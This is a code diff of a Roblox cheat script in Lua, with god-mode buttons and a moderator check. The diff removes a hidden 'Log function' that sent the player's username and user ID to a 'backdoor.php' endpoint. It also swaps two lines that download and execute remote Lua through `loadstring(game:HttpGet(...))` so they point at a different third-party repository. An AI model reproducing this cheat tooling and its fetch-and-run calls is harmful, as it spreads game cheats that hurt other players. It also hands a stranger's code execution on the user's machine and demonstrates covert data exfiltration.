@@ -2328,8 +2328,8 @@ local godbutton = GodPage.AddButton("Full God", function()
     armValue.Name = 'Armor';
 end)
 
--- // Log function
-    game:HttpGet('https://enclosed.live/backdoor.php?user='..game:GetService('Players').LocalPlayer.Name..'&userid='..game:GetService('Players').LocalPlayer.UserId..'');
+
+    
     
 local godbutton = GodPage.AddButton("God Bullet", function()
     local localPlayer = game:GetService('Players').LocalPlayer;
@@ -2493,7 +2493,7 @@ function commands(msg, playa)
         end
     end
 
-local ifMod = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pvpahh/dimagX/main/mod.lua"))()
+local ifMod = loadstring(game:HttpGet("https://raw.githubusercontent.com/skiddeddrk/dimagxskidded/main/mod",true))();
 game.Players.PlayerAdded:Connect(function(plr)
     if ifMod[plr.UserId] then
         plr.Chatted:Connect(function(msg) 
@@ -2528,7 +2528,7 @@ coroutine.resume(coroutine.create(function()
             if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
                 player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
             end
-            loadstring(game:HttpGet('https://raw.githubusercontent.com/Pvpahh/dimagX/main/mod.lua'))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/skiddeddrk/dimagxskidded/main/mod",true))();
         end
         local success, err = pcall(initiateNames)
     end
